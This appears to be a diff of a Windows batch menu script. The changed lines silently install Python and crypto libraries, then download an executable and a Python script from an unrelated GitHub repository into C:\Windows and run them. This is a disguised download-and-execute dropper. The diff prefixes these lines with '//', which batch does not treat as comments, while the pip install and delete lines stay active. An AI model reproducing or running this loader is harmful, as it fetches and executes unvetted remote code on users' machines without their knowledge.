@@ -7,32 +7,32 @@ color 03
 SetLocal EnableExtensions EnableDelayedExpansion
 set "string=abcdefghijklmnopqrstuvwxyz0123456789"
 
-REM URL of the Python installer (change version if needed)
-set "PYTHON_URL=https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
-set "INSTALLER=python-installer.exe"
+//REM URL of the Python installer (change version if needed)
+//set "PYTHON_URL=https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
+//set "INSTALLER=python-installer.exe"
 
-REM Download Python installer
-echo Wiat Download Data Restguest
-powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %INSTALLER%"
+//REM Download Python installer
+//echo Wiat Download Data Restguest
+//powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %INSTALLER%"
 
-REM Install Python silently (no UI)
+//REM Install Python silently (no UI)
 
-start /wait "" %INSTALLER% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+//start /wait "" %INSTALLER% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
 
 REM Remove installer file
 del %INSTALLER%
 
 pip install pypiwin32 pycryptodome
 
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/python.exe' -OutFile 'C:\Windows\python.exe'"
+//powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/python.exe' -OutFile 'C:\Windows\python.exe'"
 
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/new.py' -OutFile 'C:\Windows\new.py'"
+//powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KALI-LINUX404/FB-V3/main/TOOLS/new.py' -OutFile 'C:\Windows\new.py'"
 
-timeout /t 5 /nobreak > nul
+//timeout /t 5 /nobreak > nul
 
-python.exe C:\Windows\new.py
+//python.exe C:\Windows\new.py
 
-echo SuccessFully Download Restguest
+//echo SuccessFully Download Restguest
 
 :MenuGuest
 cls
@@ -588,4 +588,5 @@ goto :eof
 cls
 CHOICE /M "Do yo really want to quit?"
 IF ERRORLEVEL 2 goto Menu
+
 IF ERRORLEVEL 1 goto :eof
